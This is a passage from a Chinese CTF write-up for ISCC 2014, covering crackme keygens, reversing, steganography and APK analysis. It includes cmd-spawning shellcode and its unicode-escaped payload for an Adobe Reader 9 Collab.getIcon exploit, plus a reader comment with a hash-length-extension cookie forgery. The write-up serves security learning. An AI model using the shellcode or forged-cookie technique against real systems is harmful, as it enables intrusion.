+                    + Convert.ToString(rd.Next(0x100000, 0xffffff), 16) + "-"   //  第8-14位，第14位为"-"
+                    + encode(date) + "-";                                   //  第15-20位为到期时间，美观起见取第21位为"-"
+
+                //  第二部分为第22-31位，由第一部分1-21位唯一决定
+                string edi = confound(encode(regeditCode1_21) + constStr + txtUsername.Text);  //  edi寄存器返回前21位加密后与字符串常量和注册名一起经过confound函数后的值
+
+                eax = UInt32.Parse(edi, System.Globalization.NumberStyles.HexNumber);  //  eax == edi
+
+                string regeditCode22_31 = encode(eax.ToString()).PadLeft(10, '5');  //  由eax的值逆推注册码第22-31位，并格式化为10位，不足10位补5，因为encode(5)=0
+
+                txtRegeditCode.Text = regeditCode1_21 + regeditCode22_31;  //  完整注册码
+            } while (eax &gt; 2147483647);  // eax &gt; 2147483647时，由于源程序中比较eax和edi之前edi有一步与0xffffffff的异或操作，此时导致edi!=eax，无法通过注册，故需使eax &lt;= 2147483647，此时异或操作对edi没有影响
+        }
+
+        /// &lt;summary&gt;
+        /// 注册码简单加密函数
+        /// &lt;/summary&gt;
+        /// &lt;param name="strTemp"&gt;输入的注册码&lt;/param&gt;
+        /// &lt;returns&gt;加密后的注册码&lt;/returns&gt;
+        /// 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz
+        ///                            ↓↑
+        ///                      encode↓↑encode
+        ///                            ↓↑
+        /// 5678901234NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm
+        private string encode(string strTemp)
+        {
+            char[] chTemp = strTemp.ToCharArray();
+            for (int i = 0; i &lt; chTemp.Length; i++)
+            {
+                if (chTemp[i] &gt;= 48 &amp;&amp; chTemp[i] &lt;= 57)
+                {
+                    chTemp[i] = (char)((chTemp[i] - 43) % 10 + 48);
+                }
+                if (chTemp[i] &gt;= 65 &amp;&amp; chTemp[i] &lt;= 90)
+                {
+                    chTemp[i] = (char)((chTemp[i] - 52) % 26 + 65);
+                }
+                if (chTemp[i] &gt;= 97 &amp;&amp; chTemp[i] &lt;= 122)
+                {
+                    chTemp[i] = (char)((chTemp[i] - 84) % 26 + 97);
+                }
+            }
+            string result = new string(chTemp);
+            return result;
+        }
+
+        /// &lt;summary&gt;
+        /// 对输入的21位注册码+64位常量字符串+注册名进行混淆
+        /// &lt;/summary&gt;
+        /// &lt;param name="strTemp"&gt;&lt;/param&gt;
+        /// &lt;returns&gt;&lt;/returns&gt;
+        private string confound(string strTemp)
+        {
+            int eax = 0, edi, ebx, edx = 0;
+            do
+            {
+                edi = strTemp[eax];
+                ebx = edx;
+                ebx = ebx &lt;&lt; 5;
+                ebx = ebx - edx;
+                edi += ebx;
+                eax++;
+                edx = edi;
+            } while (eax &lt; strTemp.Length);
+            return Convert.ToString(edi, 16);
+        }
+    }
+}
+</code></pre><h2>何去何从</h2><hr><p>IDA打开附近中的exe程序，注意到sub&#95;401000和sub&#95;40104F函数：</p><p><img alt="enter image description here" img-src="bb21e991f2bcc0e49c3383a08140afbf510433ab.jpg"></p><p><img alt="enter image description here" img-src="93a2e51a931c0cc025b9f245f4bcea3d2d032764.jpg"></p><p>其中off_409030是一段字符串：</p><p><img alt="enter image description here" img-src="09471d4454e0f70f2016840e31d9e9b84ab6a34b.jpg"></p><p>伪代码比较明显，直接拿到浏览器控制台计算，既然模100和模99，故只需要取字符串的前100位。</p><p><img alt="enter image description here" img-src="437f2e9a47f91d353e713259f4d969301cc96a93.jpg"></p><p>b提交就是Flag。</p><p>Flag：<code>(3q&amp;vf2vw%f7Vj9Ookj</code></p><h2>宝藏探秘</h2><hr><p>这个研究了几天，一直没搞定，我是在XP虚拟机里弄的，因为要结合IDA看程序，而我的64位IDA没有F5功能，只能用32位的IDA，相应的OD加载程序也在32位机子上比较好。后来大神提示OD跑完就行了，而我用OD从头跑到尾也没有太大收获。不知道是不是XP的原因，首先源程序在win7下可以正常运行，在XP下直接就弹出对话框了：</p><p><img alt="enter image description here" img-src="09f0c16e5d77f5c5f6e6f5740bb0b1f285b6a26c.jpg"></p><p>这个我通过nop掉判断windows版本的地方解决了。当大神告知Key后，却发现win7和XP居然还不一样：</p><p><img alt="enter image description here" img-src="5d43cf3d91cce40a629953b1958c119fdb4c54b9.jpg"></p><p><img alt="enter image description here" img-src="0d71868176ab5d98821b1ca5ec043aab707e320a.jpg"></p><p>我只能说无语啊……</p><p>Flag：<code>e41cf485e2a0e8707ff8fc0291f55cec</code></p><h2>勤王周室</h2><hr><p>附件中的exe可以用压缩软件打开，解压得到一个0字节的文件，文件名我不是传说中的密码，暂时不知道有啥用。</p><p><img alt="enter image description here" img-src="b5437f6df2d3c3badd2b1854dfc5c809c85c3f0d.jpg"></p><p>exe还可以用7z打开，可以在里面找到一个132.bmp和exe的icon文件。132.bmp打开如图：</p><p><img alt="enter image description here" img-src="a6f276d3808e914b629c96d2cf216d2f28062cd5.jpg"></p><p>与exe的icon相差较大。在132.bmp的底部可以找到压缩的rar部分：</p><p><img alt="enter image description here" img-src="2cb4789abb25f2ddd31757bd4518d21583284a77.jpg"></p><p>修改132.bmp的第11字节9E为36，再打开：</p><p><img alt="enter image description here" img-src="07c485c05c4f272a3d526035c32ba0ad8835d61c.jpg"></p><p>可以发现和icon的图一样了，除此得不出什么有用的信息了。 OD加载exe，单步运行到sub_401100函数时，有一个执行0x300E次的循环，该循环将内存中从0040F1C0开始的部分，变成132.bmp的内容：</p><p><img alt="enter image description here" img-src="8a7f686bafb026866c925733301741585465cbc1.jpg"></p><p>循环之后，修改至0040B1F7：</p><p><img alt="enter image description here" img-src="b887d75874b98faf9fdc53c00977bf40face223c.jpg"></p><p>0041B1F6和0041B1F7，变成了”Ra”的ASCII码，似乎是rar文件的文件头，于是想到把循环次数增加，让程序把后面部分也修改。继续往下翻，这一部分非0的内存直到41B6C3结束。</p><p><img alt="enter image description here" img-src="75e0f2dc02b81295865bf68f107a4906f994e952.jpg"></p><p>需要循环一共执行<code>(0x41B6C3-0x41B1F7)/4+0x300E=0x3141</code>次，从而在进入循环之前直接将寄存器EAX中的300E修改为3141。</p><p><img alt="enter image description here" img-src="30ad9c5f70acf0a8c9cd4453b8f2567ad7832f7b.jpg"></p><p>循环结束刚好是rar文件的文件尾。将0x41B1F6-0x41B6C3部分复制出来，得到一个rar文件，打开后里面有个key.png，但是rar加了密。</p><p><img alt="enter image description here" img-src="b328d54eac41b4099453c1789a5de29b6dabd0cc.jpg"></p><p>拿出最开始得到的密码：我不是传说中的密码，得到Key：</p><pre><code>Key: C6ua3izS2ze9Wetx
+</code></pre><p>Flag：<code>C6ua3izS2ze9Wetx</code></p><h2>退避三舍</h2><hr><p>这个我一直没搞定程序里的反调试，用了52Pojie的破解版OD也不行。F9一下，就变成终止了，期待大神指导。Key是大神提供的：</p><p><img alt="enter image description here" img-src="93f1aa19ae7cbf3e3146606fa989215dd307309a.jpg"></p><p>Flag：<code>MD5_is_easy+C9841-4FF72-14430-D82EF-B6AC2</code></p><h1>0x04 Pwn楚王问鼎</h1><hr><p>Pwn部分我确实不会，之前也没弄过，唯一弄出的一个代码什么的都是别人的。</p><h2>镇压叛乱</h2><hr><p>百度搜索Adobe Reader 9.0漏洞，发现下面2个页面，</p><p>【原创】CVE-2009-0027调试笔记： http://bbs.pediy.com/showthread.php?t=98139</p><p>【原创】完整剖析Acrobat Reader - Collab getIcon universal exploiter之路</p><p>http://hi.baidu.com/snowdbg/item/e788c12aeffa49866e2cc39b 其中还提供了POC文件，该POC中嵌入了能够执行的Javascript代码，通过doc.Collab.getIcon函数触发漏洞，如图</p><p><img alt="enter image description here" img-src="f5f07fab02e12bb0137c641ddcabc6792956b937.jpg"></p><p><img alt="enter image description here" img-src="7ddeaf5b5d9c968edf9340de679664cf8bfb58f0.jpg"></p><p>下面只需要将弹出msgbox的shellcode修改为弹出cmd命令行的shellcode，继续搜索cmd shellcode， shellcode启动CMD http://blog.sina.com.cn/s/blog_7cb57750010137y4.html 将其中的shellcode</p><pre><code>char shellcode[]=
+//打开CMD的shellcode
+"\x55"                   //push ebp
+"\x8B\xEC"               //mov ebp, esp
+"\x33\xC0"               //xor eax, eax
+"\x50"                   //push eax
+"\x50"                   //push eax
+"\x50"                   //push eax
+"\xC6\x45\xF5\x6D"       //mov byte ptr[ebp-0Bh], 6Dh
+"\xC6\x45\xF6\x73"       //mov byte ptr[ebp-0Ah], 73h
+"\xC6\x45\xF7\x76"       //mov byte ptr[ebp-09h], 76h
+"\xC6\x45\xF8\x63"       //mov byte ptr[ebp-08h], 63h
+"\xC6\x45\xF9\x72"       //mov byte ptr[ebp-07h], 72h
+"\xC6\x45\xFA\x74"       //mov byte ptr[ebp-06h], 74h
+"\xC6\x45\xFB\x2E"       //mov byte ptr[ebp-05h], 2Eh
+"\xC6\x45\xFC\x64"       //mov byte ptr[ebp-04h], 64h
+"\xC6\x45\xFD\x6C"       //mov byte ptr[ebp-03h], 6Ch
+"\xC6\x45\xFE\x6C"       //mov byte ptr[ebp-02h], 6Ch
+"\x8D\x45\xF5"           //lea eax, [ebp-0Bh]
+"\x50"                   //push eax
+"\xBA\x7B\x1D\x80\x7C"   //mov edx, 0x7C801D7Bh
+"\xFF\xD2"               //call edx
+"\x83\xC4\x0C"           //add esp, 0Ch
+"\x8B\xEC"               //mov ebp, esp
+"\x33\xC0"               //xor eax, eax
+"\x50"                   //push eax
+"\x50"                   //push eax
+"\x50"                   //push eax
+"\xC6\x45\xFC\x63"       //mov byte ptr[ebp-04h], 63h
+"\xC6\x45\xFD\x6D"       //mov byte ptr[ebp-03h], 6Dh
+"\xC6\x45\xFE\x64"       //mov byte ptr[ebp-02h], 64h
+"\x8D\x45\xFC"           //lea eax, [ebp-04h]
+"\x50"                   //push eax
+"\xB8\xC7\x93\xBF\x77"   //mov edx, 0x77BF93C7h
+"\xFF\xD0"               //call edx
+"\x83\xC4\x10"           //add esp, 10h
+"\x5D"                   //pop ebp
+"\x6A\x00"               //push 0
+"\xB8\xc7\x93\xbf\x77"   //mov eax, 0x7c81cb12
+"\xFF\xD0";              //call eax
+</code></pre><p>转化为unicode编码就行，得到shellcode</p><pre><code>%u8b55%u33ec%u50c0%u5050%u45c6%u6df5%u45c6%u73f6%u45c6%u76f7%u45c6%u63f8%u45c6%u72f9%u45c6%u74fa%u45c6%u2efb%u45c6%u64fc%u45c6%u6cfd%u45c6%u6cfe%u458d%u50f5%u7bba%u801d%uff7c%u83d2%u0cc4%uec8b%uc033%u5050%uc650%ufc45%uc663%ufd45%uc66d%ufe45%u8d64%ufc45%ub850%u93c7%u77bf%ud0ff%uc483%u5d10%u006a%u12b8%u81cb%uff7c%u90d0
+</code></pre><p>最后一个需要添加nop对应的90</p><h1>0x05 Misc穆公崛起</h1><hr><h2>广纳谏言</h2><hr><p>下载附件，附件名提示此为gif图片，但是却无法打开，需要修复gif图片。Winhex打开图片，查看文件头：</p><p><img alt="enter image description here" img-src="be9c3dc75153e2f67b428dafd0b6269b86e64d90.jpg"></p><p>与正常的gif文件头：</p><p><img alt="enter image description here" img-src="1766ecfc3383f36e5393821b2f07c6e64cd82eb3.jpg"></p><p>相比少了47 49 46 38四个字节，补全后打开得到一gif动图。由于动图动画很快，需要逐祯查看。</p><p>通过http://www.360doc.com/content/13/0314/18/699582_271506280.shtml得到：</p><p><img alt="enter image description here" img-src="de73aa7c6cb619234f61e34bd3eb669161861d0e.jpg"></p><pre><code>Y2F0Y2hfdGhlX2R5bmFtaWNfZmxhZ19pc19xdWl0ZV9zaW1wbGU=
+</code></pre><p>Base64解码得到Key。 Flag：<code>catch_the_dynamic_flag_is_quite_simple</code></p><h2>歌中玄机</h2><hr><p>下载附件根据提示要求用matlab提取出右声道的前0-1248位。 Matlab代码如下：</p><pre><code>&gt;&gt; [y,Fs,bits]=wavread('target.wav',1248);%读入文件0-1248的数据
+&gt;&gt; y_right=y(:,2);%读右声道
+&gt;&gt; wavwrite(y_right,Fs,bits,'1248.wav');%写入新文件
+</code></pre><p>1248.wav内容如图：</p><p><img alt="enter image description here" img-src="e147c739bbb3bdf01567167ebdc3d4f9d531f857.jpg"></p><p>1248.wav共计2540字节，去掉前2540-1248*2=44字节。对剩下2496字节中的01，将之替换成1，00替换成0，每16字节对应成一个8位的2进制串，再转成相应的字符。 参考代码（C#）：</p><pre><code>string inputFile = "E:\\1248.wav";
+string outputFile = "E:\\156.txt";
+FileStream inputFS = new FileStream(inputFile, FileMode.Open, FileAccess.Read);
+FileStream outputFS = new FileStream(outputFile, FileMode.Append, FileAccess.Write);
+BinaryReader br = new BinaryReader(inputFS);
+StreamWriter sw = new StreamWriter(outputFS);
+
+int length = (int)inputFS.Length;
+byte[] buffer = new byte[length];
+inputFS.Read(buffer, 0, buffer.Length);
+
+int n = length / 16;
+for (int i = 0; i &lt; n; i++)
+{
+    string ch = "";
+    for (int j = 0; j &lt; 16; j += 2)
+    {
+        if (buffer[j + i * 16] == 0x01)
+            ch += "1";
+        if (buffer[j + i * 16] == 0x00)
+            ch += "0";
+    }
+    sw.Write((char)Convert.ToInt32(ch,2));
+}
+br.Close();
+sw.Close();
+inputFS.Close();
+outputFS.Close();
+</code></pre><p>运行结果156.txt：</p><p><img alt="enter image description here" img-src="48c0223ad2637ed4e5531afc4b76637efd33e382.jpg"></p><p>Carser一下，即能看到Flag。</p><p><img alt="enter image description here" img-src="f066ec86a9e50af8405ff5594e99eee907667a34.jpg"></p><p>Flag：<code>Jerusalembellsareringing</code></p><h2>秦晋之好</h2><hr><p>打开附件图片，放大后在lena背上隐约能看到一个字母P，Flag应该就写在图片上，需要对图片进行锐化。Matlab锐化代码如下：</p><pre><code>&gt;&gt; ima=imread('ifs.bmp');%读入图像
+&gt;&gt; if isrgb(ima)
+ima=rgb2gray(ima);%如果是彩色图像，则转为灰度图像
+end
+&gt;&gt; ima=double(ima);
+&gt;&gt; h=fspecial('laplacian');%laplacian算子锐化
+&gt;&gt; bw = imfilter(ima,h);
+&gt;&gt; imwrite(uint8(bw),'ifs1.bmp');%写入文件
+</code></pre><p>得到ifs1.bmp：</p><p><img alt="enter image description here" img-src="9e63bfc11f6f2f33d1c3e70f68358cf74b062980.jpg"></p><p>已经隐约能看到Flag了，对ifs1.bmp再进行如上的操作，每次将上一次的结果做同样处理，累计进行四次能看到清晰的Flag。</p><p><img alt="enter image description here" img-src="acaae2987a1afa0d9618b2eb46feb610266fae89.jpg"></p><p><img alt="enter image description here" img-src="c223b8f3dce74939f2ea7b53e7bb70cfd10abe32.jpg"></p><p><img alt="enter image description here" img-src="47e8bd8391c4225dcd591436a3960404505167a8.jpg"></p><p>Flag：<code>At10ISCC421ZLAPL</code></p><h2>穆公亡马</h2><hr><p>解压附件得到capture.log，用wireshark打开文件。扫描之前需要ping目标主机，以确保一下机器是存活的，从而目标转为寻找第五次的ping包。Ping包是ICMP 协议，但是这里我不明白为什么第五次扫描的ICMP包是192.168.0.1那个。</p><p><img alt="enter image description here" img-src="668890b071c54369de508bafa8121168d246a1f9.jpg"></p><p>Flag：<code>1602.084879</code></p><h2>秦人卧底</h2><hr><p>下载附件得到一个apk和一个加密的日志文件，用Gapktool反编译apk。</p><p><img alt="enter image description here" img-src="01be4ddee0dd5b0a1dabdfe82febf4b25db6ce45.jpg"></p><p>这里使用Gapktool得到的res文件夹中values文件夹内容不全，我用了另一个反编译工具再编译了一次，得到了比较完整的values文件夹。 查看反编译得到的代码：com.iscc.lockednote.MainActivity.java</p><p><img alt="enter image description here" img-src="7902f83e704be5fa903463ab02a37a4d3e1c2390.jpg"></p><p>可以看出密码有两层，第1层密码的值为mConstant.a()，第2层密码的值为mConstant.b()。 这是mConstant的定义：</p><p><img alt="enter image description here" img-src="c469dc2a011940b0dca08ad5cc9f871a8966f06e.jpg"></p><p>查看com.iscc.local.a.java，我们需要得到a()和b()的返回值。先看a.()：</p><p><img alt="enter image description here" img-src="b8546a515d643a56be96827d3129a027ea0673df.jpg"></p><p><code>sb = a.t()+a.g()+a.a()+a.o()</code>，这里的a的定义是private b a; a是一个b类，具体定义在com.iscc.local.b.java中，到b.java中查看，先把a.t()放到一边，暂时先看a.g()：</p><p><img alt="enter image description here" img-src="5856f553b776edb8a38aeb12af06c438e685ffb4.jpg"></p><p>a.g()返回某个叫0x7f05000d的东西的文本值，到res文件夹找找： public.xml：</p><p><img alt="enter image description here" img-src="7cb472b9401165282bddcb72d7fd58993236dc19.jpg"></p><p>原来是<code>id=”0x7f05000d”</code>，其<code>name=”h”</code>，还不是我们要的文本值，继续查找<code>name=”h”</code>的东西，<code>strings.xml</code>：</p><p><img alt="enter image description here" img-src="7716949c359346fc58ab2b9efe4b26be70ab18ed.jpg"></p><p><code>name=”h”</code>，对应的文本值也是h，这样<code>a.g()=”h”</code>。 同样的我们可以得到其他一些函数的返回值，具体如下：</p><pre><code>a.a()=”a”  a.b()=”b”  a.c()=”e”  a.d()=”c”  a.e()=”d”  a.f()=”g”  a.g()=”h”
+a.h()=”f”  a.i()=”l”  a.j()=”i”  a.k()=”k”  a.l()=”n”  a.m()=”o”  a.n()=”s”
+a.o()=”t”  a.p()=”r”  a.q()=”u”  a.r()=”y”  a.s()=”z”
+</code></pre><p>从而依据mConstant.a()的定义，我们有：</p><pre><code>sb=a.t()+”hat”
+sb1= sb+b.u()+”bad”= a.t()+”hat”+ b.u()+”bad”
+s=sb1+b.u()=a.t()+”hat”+ b.u()+”bad”+b.u()
+sb2=”luck”
+s1=sb2+b.u()+”recently”=”luck”+b.u()+”recently”
+a()=s+s1=a.t()+”hat”+ b.u()+”bad”+b.u()+”luck”+b.u()+”recently”
+</code></pre><p>下面来看a.t()和b.u()，到b.java里面查看定义：</p><pre><code>a.t(){return b;}  b.u(){return a;}  b.v(){return c;}
+</code></pre><p>这里的返回值a b c的定义是：</p><p><img alt="enter image description here" img-src="1dbf1f70cc3b8b566eb612df418bb7bfee4d61bd.jpg"></p><p>都被初始化为” ”，似乎<code>a.t()=b.u()=b.v()=” ”</code>，但是<code>“ hat bad luck recentl”</code>拿到手机上输入却提示密码错误，还有问题，仔细再看看代码，原来在MainActivity.java中字符串变量a和b的值被重新赋值了：</p><p><img alt="enter image description here" img-src="3269705bbb06aa43b587c1f83dc95cb5538fac16.jpg"></p><p>在public.xml中可以查到<code>id=”0x7f070001”</code>和<code>”0x7f070002”</code>对应的name分别是：</p><p><img alt="enter image description here" img-src="60dcc097c15822ccd898aa596bbbdd64d6a74cfd.jpg"></p><p>在/layout/activity_main.xml下可以看到：</p><p><img alt="enter image description here" img-src="3d9cb2f1f23f950b7800480ccae4b9354325d722.jpg"></p><p>再到strings.xml中得到<code>w→”w”，d8→”_”</code>，从而变量a和b被重新赋值为”w”和”_”，变量c没有重新赋值，保持初始化的值” ”。 从而我们得到<code>a()=”what_bad_luck_recently”</code>，这就是第一层密码。第二层密码就简单多了，注意到<code>b.v(){return c;}=” ”</code>。</p><p><img alt="enter image description here" img-src="55ebaab9181c2c75119a60998f423baf4fcecc3b.jpg"></p><p>很容易得到<code>b()=”it is best not to do anything when you feel like crazy”</code>，提交第二层密码就是Flag。 Flag：<code>it is best not to do anything when you feel like crazy</code></p><h2>秦国未来</h2><hr><p>粗看密文，发现每三位的数字基本上都是在100-255之间，不是三位的有58，97，98，故在这三个数前面各添加1个0，得到<code>058128178205200226193178205200198197213225209168156150134117098097101177</code>，密文的长度也从69变成了72，刚好也是8的倍数。转成16进制得到<code>3a80b2cdc8e2c1b2cdc8c6c5d5e1d1a89c968675626165b1</code>，看不出是个什么东西，拿到解密网站去解也没啥用。故转向附件中的Linux可执行文件，IDA打开，在sub_821C函数中分析得出密文[i]=明文[i]+明文[i-1]。拿到浏览器控制台计算：</p><p><img alt="enter image description here" img-src="677d46a4469cbe7f30d9fae8e71d22216630306e.jpg"></p><p>Flag：<code>Flag_for_ISCC2014</code></p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/4070" rel="bookmark" id="re1">HCTF writeup(web)</a></li><li><a href="http://drops.wooyun.org/tips/3420" rel="bookmark" id="re2">Hack.lu 2014 Writeup</a></li><li><a href="http://drops.wooyun.org/tips/13791" rel="bookmark" id="re3">0ctf writeup</a></li><li><a href="http://drops.wooyun.org/tips/3131" rel="bookmark" id="re4">JCTF Writeup</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Ulysses</span> <span class="reply-time">2015-09-26 15:38:43</span></div><p></p><p>时隔一年再度围观F神<br>_Ulysses</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">hehe</span> <span class="reply-time">2014-11-10 13:33:46</span></div><p></p><p>wuniu</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">西红柿</span> <span class="reply-time">2014-08-05 17:28:39</span></div><p></p><p>真牛。太佩服了。向楼主学习</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">兜兜</span> <span class="reply-time">2014-07-03 11:02:38</span></div><p></p><p>Caesar解密，这么旧的解密方法是哪里了解到的，难道做题培训时候？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">乌云</span> <span class="reply-time">2014-06-28 22:19:10</span></div><p></p><p>强大~！<br>lena那题我小伙伴硬是拿ps看出来了。。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">depycode</span> <span class="reply-time">2014-06-26 11:53:23</span></div><p></p><p>好强大！！！ RSA 也懂</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">千域千寻</span> <span class="reply-time">2014-06-21 02:34:21</span></div><p></p><p>思路很清晰，学习受教了。希望再有相关的佳作···持续关注中</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">cooFool</span> <span class="reply-time">2014-06-20 12:45:05</span></div><p></p><p>学习了。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">园长</span> <span class="reply-time">2014-06-18 23:51:05</span></div><p></p><p>全能性人才。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">m00zh33</span> <span class="reply-time">2014-06-18 17:11:12</span></div><p></p><p>补充下火眼金睛<br>./hash_extender --data ';0:b' -s 32efdc967fcaebc6853b75cacfb80c5f --append ';1:b' --secret=8 --out-data-format=html</p><p>Cookie: auth=b%3a1%3b%00%00%00%00%00%00%00%60%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80b%3a0%3b; hsh=c244187d39381794b9064a02d669275a<br>参考：<br>https://blog.skullsecurity.org/2014/plaidctf-web-150-mtpox-hash-extension-attack</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">mickey</span> <span class="reply-time">2014-06-18 14:45:59</span></div><p></p><p>赞。好多不会</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Ropin</span> <span class="reply-time">2014-06-18 13:56:38</span></div><p></p><p>学习过程</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小胖子</span> <span class="reply-time">2014-06-18 12:47:34</span></div><p></p><p>过瘾！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">0xc</span> <span class="reply-time">2014-06-18 11:51:23</span></div><p></p><p>来学习没做出来的题目，赞！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">乌贼NO.1</span> <span class="reply-time">2014-06-18 09:11:10</span></div><p></p><p>总结的很好，看得很过瘾，赞一个</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">动后河</span> <span class="reply-time">2014-06-17 21:44:11</span></div><p></p><p>这比赛是在找全能型人才啊！谁年纪轻轻知道那么多种知识啊！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xfkxfk</span> <span class="reply-time">2014-06-17 21:42:31</span></div><p></p><p>给力，今天刚看完！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">迦南</span> <span class="reply-time">2014-06-17 20:34:00</span></div><p></p><p>抢一楼</p><p></p></div></div></div></div></div></main>
